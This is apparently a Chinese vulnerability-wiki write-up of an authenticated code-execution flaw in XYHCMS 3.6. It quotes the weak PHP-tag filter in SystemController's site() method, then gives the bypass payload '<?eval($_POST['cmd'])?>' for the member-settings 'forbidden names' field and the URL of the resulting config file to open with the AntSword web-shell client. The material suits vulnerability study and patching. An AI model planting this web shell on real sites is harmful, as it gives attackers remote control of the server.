XYHCMS 3.6 后台代码执行漏洞（二）
=================================

一、漏洞简介
------------

二、漏洞影响
------------

XYHCMS 3.6

三、复现过程
------------

### 漏洞分析

`/App/Manage/Controller/SystemController.class.php`

    public function site() {
            if (IS_POST) {
                $data = I('config', array(), 'trim');
                //<script\s+language[\s=]+["\']*php["\']*[^>]*?\>.*?<\/script>
                $preg_param = '/<script\s+language[\s=]+["\']*php["\']*[^>]*?\>/is';
                foreach ($data as $key => $val) {
                    if (stripos($val, '<?php') !== false) {
                        $data[$key] = preg_replace('/<\?php(.+?)\?>/i', '', $val);
                    }
    ————————————————————————————————————————————————————————————————————————————
                    if (stripos($val, '<script') !== false && stripos($val, 'php') !== false) {
                        $data[$key] = preg_replace('/<script\s+language[\s=]+["\']*php["\']*[^>]*?\>.*?<\/script>/i', '', $val);
                    }
                    if (stripos($data[$key], '<?php') !== false || preg_match($preg_param, $data[$key])) {
                        $this->error('禁止输入php代码');
                    }
                }
                ————————————————————————————————————————————————————————————————————————————

### 漏洞复现

1.  进入后台

2.  系统设置-\>网站设置-\>会员配置-\>禁止使用的名称    ![1.png](/Users/aresx/Documents/VulWiki/.resource/XYHCMS3.6后台代码执行漏洞(二)/media/rId26.png){width="5.833333333333333in"
    height="2.553546587926509in"}

-   <?eval($_POST['cmd'])?>

3.  访问漏洞文件,蚁剑连接

-   `http://localhost/App/Runtime/Data/config/site.php`

    POST数据：`cmd=phpinfo();`
